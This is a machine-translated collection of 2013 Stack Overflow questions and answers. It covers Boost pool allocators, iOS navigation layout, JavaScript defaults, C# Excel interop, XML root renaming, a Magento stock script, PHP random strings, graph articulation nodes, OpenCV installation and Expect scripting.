据我所知，`boost.pool`（简化的）通过内存分配和管理主要基于 a 的大小来实现对象池模式`element_type`，并返回一个指向已分配对象的简单指针：

```
element_type * malloc();
void free(element_type * p); 
```

一个简单的 boost 示例还表明，不需要显式`free`获取获取的元素：

```
X * const t = p.malloc();
... // Do something with t; don't take the time to free() it. 
```

**问题**

我知道在销毁池对象时分配的内存将被安全释放，但是池如何知道客户端获取的内存块何时已释放回池中并且如果其接口交回直接指针则可重用to ，但仍然不需要`element_type`调用 to吗？`free()`即如果不能确定内存是否仍在使用中，提升池如何重新使用该内存？如果它不重用这个内存，这甚至被认为与维基参考解释的模式相同吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-06T13:50:07.367

> 如果无法确定内存是否仍在使用中，提升池如何重新使用该内存？

它不能。事实上，它不会重用该内存。*它只保证在池被破坏时*不会泄漏。

> 如果它不重用这个内存，这甚至被认为与维基参考解释的模式相同吗？

您链接的[文章](http://en.wikipedia.org/wiki/Object_pool_pattern)说： *在初始化类实例的成本很高的情况下，对象池可以显着提高性能*

而来自[Boost pool](http://www.boost.org/doc/libs/1_53_0/libs/pool/doc/html/boost_pool/pool/introduction.html#boost_pool.pool.introduction.when_should_i_use_pool_)的介绍：*Pools一般在小对象的分配和释放较多的情况下使用。*

所以不，它们不是相同的模式。一种是重用构建*成本高*的对象（线程、opengl 资源等）。另一个是用来管理很多小对象，给你比标准分配器更多的控制权。

正如您所指出的，有两种使用池的方法：

1.  作为分配器，在适当的时候调用 malloc()/free()。这是池分配器的基本用法，它有助于减少内存碎片
2.  构造大量的临时对象，不要费心去删除它们。

第二种情况的示例：假设您有一个图类，其中每个节点使用指针存储其邻居。现在您必须制作图表的深层副本。您将分配一堆新节点并将数据从旧节点复制到新节点，但是现在您必须初始化邻居指针，因此您需要从旧指针到新指针的映射：

```
std::map<node*,node*> old_ptr_to_new_ptr; 
```

这是一个很好的例子，池分配器很有用（我不会详细介绍如何将池分配器与 std 容器一起使用）：许多将被一起删除的小对象（映射节点）。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-06T07:09:31.797

boost pool 库提供了在分配相同类型的对象时更有效的[STL 分配器](http://en.wikipedia.org/wiki/Allocator_(C%2B%2B))`std::allocator`（而不是简单地使用`new`and `delete`）。这就是 Stroustrup 或 Alexandrescu 所说的[小对象分配器](http://books.google.ca/books?id=aJ1av7UFBPwC&pg=PA77&lpg=PA77&dq=small+object+allocator&source=bl&ots=YRgIYpWi7X&sig=MeJMRUpeXWEplULgpn15jMoKb5M&hl=en&sa=X&ei=d7xfUfDjBIXX0gHtw4DAAQ&ved=0CEwQ6AEwAg#v=onepage&q=small%20object%20allocator&f=false)。

与任何自定义分配器类一样，它基本上使用四个独立的函数：分配、解除分配、构造和销毁。我认为它们的名称是不言自明的（除非您对分配与构造感到困惑）。要从池中获取新对象，您首先调用`allocate(1)`以获取指针，然后调用`construct( ptr, value )`该指针`ptr`以将其构造为`value`（或移动）的副本。当您想要删除该对象时，您会执行相反的操作。这些是所有 STL 容器在底层使用来分配-构造-销毁-释放其对象的机制。

您不应该相信您提到的维基百科文章（一般也不应该），它的措辞非常糟糕，使用了非常模糊和不准确的语言，并且对对象池模式的看法有些狭隘。顺便说一句，引用维基百科是毫无价值的，你不知道是谁写的，没有理由相信它，总是去源头。

wiki 中描述的模式（尤其是在源文章中）与提升池分配器试图实现的目标有很大不同。如 wiki 中所述，重点是重用对象而不真正销毁它们（例如，[线程池](http://en.wikipedia.org/wiki/Thread_pool_pattern)是一个很好的例子，因为频繁创建和销毁线程会很昂贵，并且源文章对池化数据库服务感兴趣供应商出于类似原因）。在 boost pool 分配器中，重点是避免调用堆（freestore）来分配许多小对象，堆不能非常有效地执行这项任务并且会导致它变得碎片化。它可能应该被称为“小对象分配器”，以避免任何混淆。

> 池如何知道客户端获取的内存块何时已释放回池中并且如果其接口交回指向 element_type 的直接指针但仍不需要调用 free() 则可重用？

我不认为它可以。我相信故事是这样发展的。您可以选择只从池中分配一堆对象，而无需释放它们，这仍然是安全的，因为当您销毁池分配器时，它的所有内存都会被它刷新，包括您的所有对象留在池中徘徊。这就是他们所说的“不需要释放对象”的意思，只是如果您忘记从池中释放所有对象，您的应用程序不会在池分配器对象的生命周期之外泄漏内存。

但是，如果您不告诉池分配器释放您不再需要的对象（因此，可以重用），它将无法重用这些内存插槽，这是不可能的（鉴于分配器不' t 提供任何能够跟踪分配对象的特殊智能指针）。

> 如果无法确定内存是否仍在使用中，提升池如何重新使用该内存？

如果不能确定内存没有被使用，那么它就没有办法重新使用内存。任何会做出如此鲁莽的事情的代码，如“假设不再需要一个对象而不是确定”将是一段毫无价值的代码，因为它显然会具有未定义的行为，并且任何程序员都不可能使用它。

> 如果它不重用这个内存，这甚至被认为与维基参考解释的模式相同吗？

不，它没有实现 wiki 中解释的内容。您将不得不习惯术语有时会以不幸的方式发生冲突的事实。更常见的是将 boost pool 实现为“内存池”或“小对象分配器”。这是一种针对构造和复制相当便宜的小对象优化的结构。因为堆（freestore）是为更大的内存块量身定做的，并且在尝试为小对象寻找位置时往往表现不佳，因此将其用于该目的并不是一个好主意，并且可能导致堆碎片。因此，池分配器本质上用在分配许多相同类型的小对象时更有效的东西代替了堆。它不重用对象，但它可以重用已释放的内存，就像堆一样。`std::vector`）。在适当的时候使用小对象分配器还有许多其他性能优势。但是 boost pool 实现的实际上与 wiki 中描述的有很大不同。以下是实现者对池分配器的优点的描述：

> 使用 Pool 的好地方是在堆上可能分配许多（不连续的）小对象，或者相同大小的对象的分配和释放重复发生的情况。

# iphone - 如何制作宽度不全屏的 UINavigationController？

> ID：15847361
> 
> 赞同：3
> 
> 时间：2013-04-06T05:27:02.557
> 
> 标签：iphone, ios, uinavigationcontroller, width, uinavigationbar

我正在尝试实现 Facebook 样式的后视图菜单导航模式（使用[viewDeck](https://github.com/Inferis/ViewDeck)），并且在使主视图后面的 navigationController**小于**屏幕宽度时遇到了麻烦。

由于主视图中仍有一些覆盖，我需要我的导航控制器只有 276 点宽。这意味着 navController 的右侧将与部分可见的主 viewController 的边缘齐平。

在主视图后面时，如何缩小我的 navController 以便深入查看视图？是否可以？到目前为止，我所做的一切都只是让导航栏全屏显示。

编辑 1：使用 PKRevealController 进行测试：

![在此处输入图像描述](https://i.stack.imgur.com/oxLLU.png)

如您所见，文本离开屏幕，您看不到它的结尾。如果您稍微切换一下窗台，您可以看到后视图导航栏一直到边缘。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T14:55:15.000

如果您想重新实现 Facebook 应用程序的行为，您可能需要节省一些时间并查看以下项目之一：

*   [很棒的菜单](https://github.com/levey/AwesomeMenu)
*   [DDMenuController](https://github.com/devindoty/DDMenuController)
*   [ECSlidingViewController](https://github.com/edgecase/ECSlidingViewController)
*   [IRSlidingSplitViewController](https://github.com/iridia/IRSlidingSplitViewController)
*   [JASidePanels](https://github.com/gotosleep/JASidePanels)
*   [JTRevealSidebarDemo](https://github.com/mystcolor/JTRevealSidebarDemo)
*   [JWS幻灯片菜单](https://github.com/jeremieweldin/JWSlideMenu)
*   [PKRevealController](https://github.com/pkluz/PKRevealController)
*   [SAS幻灯片菜单](https://github.com/stefanoa/SASlideMenu)
*   [观景台](https://github.com/Inferis/ViewDeck)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T15:15:10.883

它可以创建一个 UINavigationController 小于它所包含的视图的宽度。我快速浏览了您正在使用的库，似乎每个子视图的框架都设置为窗口的大小，向左或向右偏移一定量（请参阅 和的函数`referenceBounds`）`centerViewBounds``sideViewBounds`

要将导航控制器更改为完全可见，您需要将其更改为原点相同且宽度为 276.0f，因此我认为您需要修改 sideViewBounds 方法以返回稍小的 CGRect

# javascript - JS 如果不是变量

> ID：15847364
> 
> 赞同：0
> 
> 时间：2013-04-06T05:27:46.197
> 
> 标签：javascript

所以我想编写一个带有 3 个参数的函数，第三个是可选的。我想要检查一下，如果 optional 不存在，那么给它一个默认值。有没有 IF Not 的方法？如果没有，那么最好的方法是什么？

这就是我要的

```
foo.(x,y, opt){
if (!opt){opt = 1;}
......
...... 
} 
```

这就是我所拥有的：

```
foo.(x,y, opt){
if (opt){}
else {opt = 1;};
......
...... 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:30:46.080

如果参数未传递给函数，则为`undefined`.

```
function foo( x, y, opt ){
    if( typeof opt === 'undefined' ){ 
        opt = 1;
    }
    ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:31:16.053

在 javascript 中，您可以像这样添加默认值：

```
function foo(x,y,opt){
 if(typeof(opt)==='undefined') opt = 1;
 //your code
} 
```

# c# - 从 C# 读取一个巨大的 Excel 列

> ID：15847367
> 
> 赞同：0
> 
> 时间：2013-04-06T05:28:36.943
> 
> 标签：c#, excel, multithreading

我有一个包含四列的 Excel（可能是 2010 或 2013，不知道以后会不会出现问题）文档。前三列存储电话号码，它们基本上是一个包含 10 个或更多字符的字符串。仅四列将永远存储 1、2、3 或 4，它是一个类别。我需要检查**A**列中的每个数字是否出现在**B**列和**C**列中，所以我认为读取每列的所有 Excel 单元格并存储在一个列表中（尚未实现，因为我将在下面解释这个问题） . 为此，我制作了以下代码：

```
private void btnCargarExcel_Click(object sender, EventArgs e)
        {
            if (this.openFileDialog1.ShowDialog() == DialogResult.OK)
            {

                if (System.IO.File.Exists(openFileDialog1.FileName))
                {
                    filePath.Text = openFileDialog1.FileName.ToString();

                    Excel.Application xlApp;
                    Excel.Workbook xlWorkBook;
                    Excel.Worksheet xlWorkSheet;
                    Excel.Range range;

                    string str;

                    int rCnt = 0;

                    xlApp = new Microsoft.Office.Interop.Excel.Application();
                    xlWorkBook = xlApp.Workbooks.Open(openFileDialog1.FileName, 0, true, 5, "", "", true, Microsoft.Office.Interop.Excel.XlPlatform.xlWindows, "\t", false, false, 0, true, 1, 0);
                    xlWorkSheet = (Excel.Worksheet)xlWorkBook.Worksheets.get_Item(1);

                    range = xlWorkSheet.UsedRange;

                    for (rCnt = 1; rCnt <= range.Rows.Count; rCnt++)
                    {
                        str = (range.Cells[rCnt, 1] as Excel.Range).Value2.ToString();
                        //bd.Add(cleanString(str));

                        bd.Add(cleanString(str, 10));
                    }

                    for (rCnt = 1; rCnt <= range.Rows.Count; rCnt++)
                    {
                        str = (range.Cells[rCnt, 2] as Excel.Range).Value2.ToString();
                        //bd.Add(cleanString(str));

                        bl.Add(cleanString(str, 10));
                    }

                    for (rCnt = 1; rCnt <= range.Rows.Count; rCnt++)
                    {
                        str = (range.Cells[rCnt, 3] as Excel.Range).Value2.ToString();
                        //bd.Add(cleanString(str));

                        cm.Add(cleanString(str, 10));
                    }

                    nrosProcesados.Text = bd.Count().ToString();
                    listBox1.DataSource = bd;

                    noProcesadosBL.Text = bl.Count().ToString();
                    listBox2.DataSource = bl;

                    noProcesadosCM.Text = cm.Count().ToString();
                    listBox3.DataSource = cm;

                    xlWorkBook.Close(true, null, null);
                    xlApp.Quit();

                    releaseObject(xlWorkSheet);
                    releaseObject(xlWorkBook);
                    releaseObject(xlApp);
                }
                else
                {
                    MessageBox.Show("No se pudo abrir el fichero!");
                    System.Runtime.InteropServices.Marshal.ReleaseComObject(appExcel);
                    appExcel = null;
                    System.Windows.Forms.Application.Exit();
                }
            }
        } 
```

因此，我在列中迭代槽单元格，并在进行一些字符串更改后将每个数字存储在列表中，正如您在代码中看到的那样。这里的问题是A列有797340个单元格，B列有91617个单元格，C列有95891个单元格，所以如果我运行应用程序，加载Excel并等待我的PC挂出（即使有12GB的RAM和Core i3处理器）我需要打开任务管理器并结束任务。为了得到我想要的东西（只留下不重复的数字）而不是挂出我的电脑，最好的解决方案是什么？每个周期都可以将事情分成单独的线程（我对此不太了解，因为我是从 C# 开始的，所以任何帮助都将不胜感激）？你对这个话题有什么看法？

**编辑：添加一个新的干净的方法**

因此，在阅读并阅读并从这里的一些成员那里获得帮助后，我对代码进行了一些改进，但现在我遇到了另一个问题（在代码下方注释）。现在看代码：

```
// this goes first when I declare vars
public static System.Array objRowAValues;

// this goes in action when I click the button (I leave only relevant part)
Excel.Application xlApp;
Excel.Workbook xlWorkBook;
Excel.Worksheet xlWorkSheet;
Excel.Range range, rngARowLast;

string str;
int rCnt = 0;

long lastACell, fullRow;

xlApp = new Microsoft.Office.Interop.Excel.Application();
xlWorkBook = xlApp.Workbooks.Open(openFileDialog1.FileName, 0, true, 5, "", "", true, Microsoft.Office.Interop.Excel.XlPlatform.xlWindows, "\t", false, false, 0, true, 1, 0);
xlWorkSheet = (Excel.Worksheet) xlWorkBook.Worksheets.get_Item(1);

range = xlWorkSheet.UsedRange;

fullRow = xlWorkSheet.Rows.Count;
lastACell = xlWorkSheet.Cells[fullRow, 1].End(Excel.XlDirection.xlUp).Row;
rngARowLast = xlWorkSheet.get_Range("A1", "A" + lastACell);
objRowAValues = (System.Array) rngARowLast.Cells.Value; 
```

现在因为我将用来自 objRowAValues 的值填充 ListBox，而 ListBox 只接受 List 作为 DataSource，所以我需要将 objRowAValues 转换为字符串列表。我试试[这个](https://stackoverflow.com/questions/1970738/convert-system-array-to-string)，但它不适合我。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T07:53:41.493

不幸的是，我更像是一个 VB.NET 人——所以我已经为你转换了一些代码。我希望这是开箱即用的——我在这里不使用这种工具，所以我无法测试它。

```
public void test()
{
    object[,] RaWData = null;

    dynamic range = xlWorkSheet.UsedRange;

    //i am unsure here about the correct order - I do not work with excel at Work, so you might have to change the following lange, if columns needs to be before rows or so
    RaWData = range.value2;

    //I am using a list here, because Lists are a lot easier to work with then simple arrays
    List<List<string>> RealData = new List<List<string>>();

    //start at 1  because the excel-delivered array do not have values at index 0 - this is the only 1-based array you will ever encounter in .net
    for (x = 1; x <= Information.UBound(RaWData, 1); x++) {
        List<string> templist = new List<string>();
        for (y = 1; y <= Information.UBound(RaWData, 2); y++) {
            templist.Add(RaWData[x, y].ToString());
        }
        RealData.Add(templist);
    }

    //you should be finished here...
} 
```

# c# - 使用 C# 重命名 xml 根节点

> ID：15847369
> 
> 赞同：0
> 
> 时间：2013-04-06T05:28:44.463
> 
> 标签：c#, asp.net

我正在使用下面的代码来更改根节点名称。但它不适合我。请帮助我做到这一点。我的部分代码如下。

```
XmlNode PackageListNode = hst_doc.SelectSingleNode("NewDataSet");
                XmlNodeList PackageNodeList = PackageListNode.SelectNodes("Table5");

                hst_doc.DocumentElement.Name.Replace("NewDataSet", "rows"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:47:15.700

尝试这个

```
// Obtain a document; this method is implemented in
// The Quintessential Program to Create a DOM Document from an XML File
Document doc = parseXmlFile("infilename.xml", false);

// Obtain the root element
Element element = doc.getDocumentElement();

// Create an element with the new name
Element element2 = doc.createElement("newname");

// Copy the attributes to the new element
NamedNodeMap attrs = element.getAttributes();
for (int i=0; i<attrs.getLength(); i++) {
    Attr attr2 = (Attr)doc.importNode(attrs.item(i), true);
    element2.getAttributes().setNamedItem(attr2);
}

// Move all the children
while (element.hasChildNodes()) {
    element2.appendChild(element.getFirstChild());
}

// Replace the old node with the new node
element.getParentNode().replaceChild(element2, element); 
```

**或试试这个**

```
XDocument doc = XDocument.Load("input.xml");
            doc.Root.Name = "program";
            doc.Save("output.xml"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:32:27.340

参考这个链接：

[http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.aspx](http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.aspx)

遵循以下代码：

```
XmlDocument objDoc = new XmlDocument();
objDoc.LoadXml(str);
XmlDocument objNewDoc = new XmlDocument();
XmlElement objNewRoot = objNewDoc.CreateElement("MasterList");
objNewDoc.AppendChild(objNewRoot);
objNewRoot.InnerXml = objDoc.DocumentElement.InnerXml;
String xml = docNew.OuterXml; 
```

希望它有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:37:01.917

我相信您在更改后没有调用 Save() 方法，请尝试以下代码

```
 XmlNode PackageListNode = hst_doc.SelectSingleNode("NewDataSet");
        XmlNodeList PackageNodeList = PackageListNode.SelectNodes("Table5");

        hst_doc.DocumentElement.Name.Replace("NewDataSet", "rows");

        hst_doc.Save("filename"); 
```

# magento - 可配置产品导入库存 csv 时的 Magento 可用性错误

> ID：15847370
> 
> 赞同：0
> 
> 时间：2013-04-06T05:28:57.310
> 
> 标签：magento, csv

我有一个小脚本，可以在我的 Magento 商店中导入我的卖家库存可用性。

它与简单产品和子产品完美配合，但对可配置产品有一些奇怪的问题。当脚本运行时，它会放置可配置为“不可用”的随机产品。

我必须去管理员，选择所有可通过视图“目录/搜索”配置的产品（确保只选择父可配置产品）并将其在库存上的所有属性更改为“可用”。

有什么办法不让库存检查只对可配置产品起作用？这是我的脚本，任何人都看到了错误，或者可以帮助我了解如何进行另一个递归检查以将所有可配置产品都设为可用？

```
<?php
define('MAGE_BASE_DIR', realpath(dirname(__FILE__)));
require_once(MAGE_BASE_DIR.'/app/Mage.php');

$file = MAGE_BASE_DIR."/var/import/stock.csv";

$handle = @fopen($file, "r");
if ($handle) {
require_once(MAGE_BASE_DIR.'/app/Mage.php');
Mage::app()->setCurrentStore(Mage_Core_Model_App::ADMIN_STORE_ID);

while (!feof($handle)) {
   $linea = fgets($handle);
   $linea2 = str_replace('"', '', $linea);
    $dati = explode(";", $linea2);

$ref = trim($dati[0]);
    $sku = trim($dati[1]);
    $titolo = trim ($dati[2]);
    $qta = trim($dati[3]);
    $disponibile = trim($dati[4]);

    $product = Mage::getModel('catalog/product');
    $stockItem = Mage::getModel('cataloginventory/stock_item');

    $productId = $product->getIdBySku($sku);
    if ($productId !== false) {
        $product->load($productId);

        $stockItem->loadByProduct($productId);
        $stockItem->setData('qty', $qta);
        $stockItem->setData('is_in_stock', ($qta > 0) ? 1 : 0);

        try {
            $stockItem->save();
            echo "<span style='color:#ff0000; weight:bold;'>{$sku} elaborato     correttamente.</span> ";
        } catch(Exception $e) {
            $countException++;
            echo "{$sku} errore ({$e->getMessage()}). ";
        }
    } else {
        echo "{$sku} non trovato.";
    }

    unset($product);
    unset($stockItem);
}
fclose($handle);    
} else {
echo "Errore apertura file. ({$file})";
exit();}

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T19:32:30.810

我认为输入数据有误。Magento 不保存可配置产品的数量。我认为您不应该更新可配置产品的库存项目。

此外，您正在加载产品模型，但您没有使用它。尝试评论这一行

```
$product->load($productId); 
```

你的脚本应该快得多。

# php - PHP - 在字符串中选择 5 个随机字符？

> ID：15847377
> 
> 赞同：3
> 
> 时间：2013-04-06T05:29:53.773
> 
> 标签：php

如何从给定的字符串中随机选择 5 个字符？他们可以重复。

说我的字符串是这样的：

```
static $chars = "123456789bcdfghjkmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ"; 
```

我只想从该变量中取出 5 个随机字符。感谢任何可以帮助我的人！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:33:31.493

```
function gen_code() {

    $charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

    return substr(str_shuffle($charset), 0, 5);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T05:36:20.477

只需创建 5 个随机索引并从字符串中获取字符：

```
$chars = "123456789bcdfghjkmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ";
$length = strlen($chars) - 1;
$randchars = '';
for ($i = 0; $i < 5; $i++) {
    $position = mt_rand(0, $length);
    $randchars .= $chars[$position];
}
echo $randchars; 
```

如果您只是想获得一个 5 字符长的随机字符串，那么有更好的方法可以做到这一点。从操作系统获取随机数据，然后对其进行编码，将是理想的方式：

```
function random_string($length) {
    $raw   = (int) ($length * 3 / 4 + 1);
    $bytes = mcrypt_create_iv($raw, MCRYPT_DEV_URANDOM);
    $rand  = str_replace('+', '.', base64_encode($bytes));
    return substr($rand, 0, $length);
}
echo random_string(5); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-06T05:40:00.713

它的工作，请尝试它，

```
<?php
    $length = 5;
    $randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $length);
    echo $randomString;
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T05:32:37.757

尝试这个

```
 static $chars = "123456789bcdfghjkmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ";
  $chars=str_shuffle($chars);
  $finalString=substr($chars, 0,5); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-06T05:33:40.497

只需将您`$chars`传入此函数，它将返回 5 个随机字符。

```
// to generate random string

function rand_str($length = 5, $chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
{
    // Length of character list
    $chars_length = (strlen($chars) - 1);
    // Start our string
    $string = $chars{rand(0, $chars_length)};
    // Generate random string
    for ($i = 1; $i < $length; $i = strlen($string))
    {
        // Grab a random character from our list
        $r = $chars{rand(0, $chars_length)};
       // Make sure the same two characters don't appear next to each other
       if ($r != $string{$i - 1}) $string .=  $r;
    }
    // Return the string
    return $string;
}

// function ends here 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-06T05:45:27.160

```
$var = explode(',' , '1,2,3,4,5,6,7,8,9,a,b,c,d,f,g,h,j,k,m,n,p,q,r,s,t,v,w,x,y,z,B,C,D,F,G,H,J,K,L,M,N,P,Q,R,S,T,V,W,X,Y,Z');
$string ='';
for($i=0; $i <= 4; $i++)
{
    $string .= $var[rand(0, count($var)-1)];
}

echo $string; 
```

编辑*有一个错误，“count($var)”应该是“count($var)-1”

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-05-13T12:26:47.710

```
//define a function    
function generateRandomString($length = 5){
    $chars = "123456789bcdfghjkmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ";
    return substr(str_shuffle($chars),0,$length);
}

//usage
echo generateRandomString(5); //random string legth: 5
echo generateRandomString(6); //random string legth: 6
echo generateRandomString(7); //random string legth: 7 
```

# graph - 无向图中的关键节点数

> ID：15847381
> 
> 赞同：4
> 
> 时间：2013-04-06T05:30:18.817
> 
> 标签：graph, depth-first-search

我有一个包含 N 个节点和 E 边的图 G。每条边都是无方向的。目标是找到第一个。的关键节点。

删除时使图形断开的节点称为关键节点。目标是找到没有。图中的此类节点。

一个解决方案是： -

对于属于图中的每个节点，将其从图中删除，从剩余的图中选择一个节点，执行 dfs，如果我们能够到达任何地方，那么它就不是关键节点。

此解决方案是 O(N*E) 或最坏情况 O(N^3)。

是否有 O(N^2) 解决方案或 O(E) 解决方案，因为 N^3 有点太慢了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-07T08:18:01.490

关键节点是一个节点，当它被移除时，会将图切割成 2 个或更多不相交的子图。

因此，**关键节点是连接到仅通过该关键节点连接的 2 个或多个子图的节点**。

一个可能的解决方案可能是这样的：

*   对于图 G 中的每个节点 i：

    1.  列表 L：直接连接到节点 i 的所有节点

    2.  如果列表 L 中存在 2 个节点 u 和 v，使得没有路径通过 v 连接 u 而不是 i，那么 i 是关键节点

参考：[维基百科：循环检测](http://en.wikipedia.org/wiki/Cycle_detection)

示例（在 Java 中）：

```
public class CrucialNode
{
    public static ArrayList<Node> crucialVertices (Graph g)
    {
        ArrayList<Node> crucial = new ArrayList<Node> ();

        for (Node n : g.getV()) if (isCrucial(g,n)) crucial.add(n);

        return crucial;
    }

    public static boolean isCrucial (Graph g, Node n)
    {
        Graph h = new Graph(g);

        h.removeVertex(n);

        for (Node u : n.getNext())
        {
            for (Node v : n.getNext())
            {
                if (u.equals(v)) continue;

                if (!h.connected(u,v)) return true;
            }
        }

        return false;
    }
} 
```

# iphone - 选择不支持 iOS 设备

> ID：15847387
> 
> 赞同：5
> 
> 时间：2013-04-06T05:30:58.937
> 
> 标签：iphone, ios, frame-rate

我正在构建一个图形有点重的应用程序，它在 iPhone 4 上以较差的帧率运行，但在 4S 和 5 上运行良好。有没有办法选择不支持 4 和更早版本？

我已经看到应用程序说它在描述中不起作用，但有没有办法真正阻止人们下载它，除非在 4S 及更高版本上？

编辑：

我的应用因需要 Bluetooth-Le 而被拒绝。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T05:35:25.347

不，目前无法在您的应用版本中定位特定设备。

**编辑**

虽然我上面所说的仍然适用，但有一个可行的解决方法只针对 iPhone 4S 和 iPhone 5。事实上，您不能针对设备，但您可以针对设备功能，根据[本](http://developer.apple.com/library/ios/#documentation/LanguagesUtilities/Conceptual/iTunesConnect_Guide/B_DeviceCompatibilityMatrix/DeviceCompatibilityMatrix.html#//apple_ref/doc/uid/TP40011225-CH17-SW1)文档，只有iPhone 4S 和 iPhone 5 有：**`bluetooth-le`**.

因此，如果您以特定设备功能为目标，则仅支持这些设备。

为此，只需在应用程序的 plist 中包含键`bluetooth-le`下的功能。`UIRequiredDeviceCapabilities`

# 免责声明

根据 OP 的经验，您的应用程序可能会因为需要功能而不使用它而被**拒绝。**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T06:02:07.863

您可以`UIRequiredDeviceCapabilities`在 Info > Custom iOS Target Proprieties 下的应用程序目标中使用该键。

[您可以在Information Property List Key Reference](http://developer.apple.com/library/ios/#documentation/general/Reference/InfoPlistKeyReference/Articles/iPhoneOSKeys.html)的苹果文档中找到有关此内容的更多详细信息。

你需要做的是需要一些 iPhone4 不支持的功能。

**更新**

根据@Gabriele Petronella 的回答编辑了截图

![在此处输入图像描述](https://i.stack.imgur.com/z537y.png)

# macos - 安装 OpenCV 2.4.3 Mac OSX 链接 CXX 时出错

> ID：15847392
> 
> 赞同：2
> 
> 时间：2013-04-06T05:31:33.600
> 
> 标签：macos, opencv, linker, installation

我正在尝试使用 MacPort 在 Mac OSX 10.7.5 上安装 OpenCV 2.4.3。我通过自制软件安装了 opencv 2.4.4。但是当我尝试链接库时，我在通过 qmake (Qt): 编译程序时不断收到错误消息`symbols not found architecture _x86-64`。所以现在我正在尝试通过 MacPort 安装 opencv 2.4.3，但我不断收到以下错误：

```
Linking CXX shared library ../../lib/libopencv_highgui.dylib
ld: library not found for -lmp3lame
clang: error: linker command failed with exit code 1 (use -v to see invocation)
make[2]: *** [lib/libopencv_highgui.2.4.3.dylib] Error 1
make[1]: *** [modules/highgui/CMakeFiles/opencv_highgui.dir/all] Error 2
make: *** [all] Error 2 
```

任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T05:58:02.697

*   使用自制软件安装 opencv 后，您可能应该在 makefile 中添加额外的搜索路径（请注意，必须在没有 --32 位标志的情况下安装 opencv）。您也可以尝试使用标志 --with-qt 安装它（请参阅 参考资料`brew info opencv`）。也看看[这里](https://stackoverflow.com/questions/7909878/linking-opencv-2-3-program-in-mac-os-x-lion-symbols-not-found-for-architectur)- 可能是你的情况。

*   对于通过 macports 安装过程中的错误：只需先安装所有依赖项。在你的情况下可能`sudo port install lame`。
*   您也可以使用[安装指南自行安装](http://opencv.willowgarage.com/wiki/InstallGuide)，例如[本](http://blog.cingusoft.org/howto-install-opencv-on-mac-os-x-lion)（OS X 10.7）或[本](http://tech.enekochan.com/2012/07/27/install-opencv-2-4-2-with-ffmpeg-support-in-mac-os-x-10-8/)（OS X 10.8）教程
*   检查此页面右栏中的相关问题 - 它们也可能会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T06:36:52.887

您的链接器告诉您：

1.  Qt 没有安装在你的机器上（或者至少在 shell 不知道的位置）；

2.  `lame`（以及相关的库）未安装在您的系统上。如果是，则它位于（根据 macports 标准）安装在`/opt/`目录中，默认情况下不在搜索路径中。您必须修改您`.bashrc`或您的`.profile`文件才能添加它。

为了在 MacOS 上安装 OpenCV，我绝对建议使用从源代码编译（在 github 上）或从[homebrew](http://mxcl.github.io/homebrew/)安装。在第一种情况下，您控制传递给 cmake 的每个选项以适应您的系统，而在第二种情况下，您有一个更具反应性的社区（根据我的经验）来解决安装问题并坚持使用最新版本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T17:47:57.287

我格式化了我的硬盘驱动器，从而删除了所有内容。我重新下载了 Qt Creater 及其对应的 mac 库，并通过 MacPorts 安装了 OpenCV。一切都很顺利，我现在在 Qt 上使用 OpenCV。我想我第一次可能做错了什么。感谢所有试图帮助我的人。我感谢您的时间和努力。

# expect - 如何将多字空格分隔的字符串值作为单独的参数传递给期望脚本中的程序？

> ID：15847403
> 
> 赞同：2
> 
> 时间：2013-04-06T05:32:58.913
> 
> 标签：expect

假设我有一个简单的`expect`脚本 ( `simple.exp`)：

```
set command "ls -l somedir"
spawn $command
interact 
```

执行此脚本会导致错误，因为`expect`将 ls -l（带有空格的整个字符串）视为命令而不是 ls 作为命令和 -l 作为选项：

```
expect -f simple.exp
spawn ls -l
couldn't execute "ls -l somedir": no such file or directory
     while executing
"spawn $command"
     (file "simple.exp" line 2) 
```

我想要的是类似于首先`bash`处理字符串并将其分解为不同的参数以启动命令的行为：

```
bash -c "ls -l somedir" 
```

请注意，`command`为简单起见，变量在脚本中是硬编码的。在实际脚本中，它作为参数（任意命令行字符串）提供。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T17:05:01.037

解决方案的提示在[这个问题](https://stackoverflow.com/questions/5124185/what-does-do-in-tcl)的答案中（`expect`使用`tcl`语言）：

```
set command "ls -l somedir"
spawn {*}$command
interact 
```

